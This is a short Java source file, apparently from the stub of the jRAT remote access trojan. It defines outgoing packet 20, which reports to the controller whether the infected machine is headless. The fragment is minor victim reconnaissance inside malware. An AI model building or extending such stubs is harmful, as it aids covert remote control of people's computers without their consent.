package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.common.utils.Utils;

import java.io.DataOutputStream;

public class Packet20Headless extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeBoolean(Utils.isHeadless());
	}

	@Override
	public byte getPacketId() {
		return (byte) 20;
	}

}